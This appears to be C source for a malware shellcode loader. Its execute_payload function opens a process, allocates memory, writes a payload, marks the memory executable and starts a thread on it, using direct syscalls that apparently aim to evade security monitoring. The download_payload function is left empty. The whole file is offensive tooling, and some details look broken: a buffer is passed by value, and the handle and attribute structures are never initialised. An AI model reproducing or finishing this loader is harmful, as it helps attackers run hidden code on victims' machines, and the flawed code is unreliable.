#include "core.h"
#include "syscall.h"

char* download_payload(SIZE_T* payload_size) {

}

BOOL execute_payload(char* payload, SIZE_T payload_size) {

    NTSTATUS status;
    HANDLE hproc;
    HANDLE hthread;
    CLIENT_ID cid;
    OBJECT_ATTRIBUTES oa;
    PVOID pbuff;
    SIZE_T pbytes_written;

    // NOTE: payload is injected in current process
    status = Syscall(NT_OPEN_PROCESS, 4, &hproc, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status) || !hproc) {
        DEBUG_PRINT("[-] Failed to open process.");
        goto fail;
    }

    status = Syscall(NT_ALLOCATE_VIRTUAL_MEMORY, 6, hproc, pbuff, NULL, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status) || !pbuff) {
        DEBUG_PRINT("[-] Failed to allocate virtual memory.");
        goto fail;
    }

    status = Syscall(NT_WRITE_VIRTUAL_MEMORY, 5, hproc, pbuff, payload, payload_size, &pbytes_written);
    if (!NT_SUCCESS(status) || pbytes_written < payload_size) {
        DEBUG_PRINT("[-] Failed to write virtual memory.");
        goto fail;
    }

    status = Syscall(NT_PROTECT_VIRTUAL_MEMORY, 5, hproc, pbuff, &payload_size, PAGE_EXECUTE_READ, NULL);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("[-] Failed to change permissions of virtual memory.");
        goto fail;
    }

    status = Syscall(NT_CREATE_THREAD, 11, &hthread, THREAD_ALL_ACCESS, NULL, hproc, (LPTHREAD_START_ROUTINE)pbuff, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status) || !hthread) {
        DEBUG_PRINT("[-] Failed to create thread.");
        goto fail;
    }

    success:
    CloseHandle(hproc);
    CloseHandle(hthread);
    return TRUE;

    fail:
    CloseHandle(hproc);
    CloseHandle(hthread);
    return FALSE;
    
}